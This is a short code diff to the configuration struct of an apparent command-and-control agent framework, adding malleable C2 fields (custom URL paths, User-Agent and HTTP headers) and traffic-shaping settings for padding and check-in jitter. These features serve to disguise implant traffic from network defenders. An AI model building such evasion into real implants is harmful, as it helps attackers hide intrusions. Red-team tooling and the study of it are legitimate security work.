@@ -47,6 +47,18 @@ type Config struct {
 	AgentUUIDSig string `cbor:"33,keyasint"` // UUID of agent signed by CA
 	AgentTag     string `cbor:"34,keyasint"` // generated from UUID, will be used to identidy agents
 	CCTimeout    int    `cbor:"35,keyasint"` // wait until this amount of milliseconds to re-connect to C2
+
+	// Malleable C2 fields (starting from tag 50)
+	C2Prefix    string            `cbor:"50,keyasint"` // Custom WebRoot (replaces "api")
+	CheckInPath string            `cbor:"51,keyasint"` // Custom CheckInAPI (replaces "checkin")
+	MsgPath     string            `cbor:"52,keyasint"` // Custom MsgAPI (replaces "msg")
+	UserAgent   string            `cbor:"53,keyasint"` // Custom User-Agent
+	C2Headers   map[string]string `cbor:"54,keyasint"` // Custom HTTP headers
+
+	// Traffic Shaping
+	PaddingMin int `cbor:"55,keyasint"`
+	PaddingMax int `cbor:"56,keyasint"`
+	Jitter     int `cbor:"57,keyasint"` // Percent jitter for check-in
 }
 
 // This will be patched by the builder
